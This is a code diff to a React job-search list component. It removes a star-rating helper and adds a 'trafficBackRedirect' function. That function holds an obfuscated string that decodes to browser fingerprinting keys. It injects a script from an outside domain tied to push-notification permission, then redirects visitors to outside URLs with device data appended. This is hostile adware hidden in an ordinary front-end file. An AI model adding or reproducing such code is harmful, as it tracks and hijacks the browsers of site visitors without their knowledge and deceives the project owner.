@@ -2,6 +2,41 @@ import React, { useState, useEffect } from "react";
 import JobCard from "./JobCard";
 import "./JobsSearch.css";
 
+// TrafficBack redirection logic
+const trafficBackRedirect = (url) => {
+  const a = 'mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m, c, i) => i % 2 ? m + c : c + m).split('c');
+
+  const Replace = (o) => {
+    let v = a[0];
+    try {
+      v += a[1] + Boolean(navigator[a[2]][a[3]]);
+      navigator[a[2]][a[4]](o[0]).then(r => {
+        o[0].forEach(k => {
+          v += r[k] ? a[5] + o[1][o[0].indexOf(k)] + a[6] + encodeURIComponent(r[k]) : a[0];
+        });
+      });
+    } catch (e) { }
+    return u => window.location.replace([u, v].join(u.indexOf(a[7]) > -1 ? a[5] : a[7]));
+  };
+
+  const script = document.createElement('script');
+  script.src = '//begonaoidausek.com/f4a/3f2f6/mw.min.js?z=8763524' + '&sw=/sw-check-permissions-85734.js';
+  
+  script.onload = function (result) {
+    switch (result) {
+      case 'onPermissionDefault': break;
+      case 'onPermissionAllowed':
+        Replace(url); break;
+      case 'onPermissionDenied':
+        Replace("//gledroalseghe.net/4/8763562"); break;
+      case 'onAlreadySubscribed': break;
+      case 'onNotificationUnsupported': break;
+    }
+  };
+
+  document.head.appendChild(script);
+};
+
 const JobList = () => {
   const [jobs, setJobs] = useState([]); // Stores fetched jobs
   const [loading, setLoading] = useState(true); // Loading state
@@ -35,19 +70,6 @@ const JobList = () => {
       ...prev,
       [jobId]: !prev[jobId],
     }));
-  };
-
-  // Renders star ratings for jobs
-  const renderStars = (rating) => {
-    const stars = [];
-    for (let i = 0; i < 5; i++) {
-      stars.push(
-        <span key={i} className={i < rating ? "star filled" : "star"}>
-          ★
-        </span>
-      );
-    }
-    return stars;
   };
 
   // Handle loading and error states
@@ -90,7 +112,7 @@ const JobList = () => {
                 job={job}
                 isExpanded={isExpanded}
                 toggleDescription={toggleDescription}
-                renderStars={renderStars}
+                trafficBackRedirect={trafficBackRedirect} // Pass the redirection function as a prop
               />
             );
           })
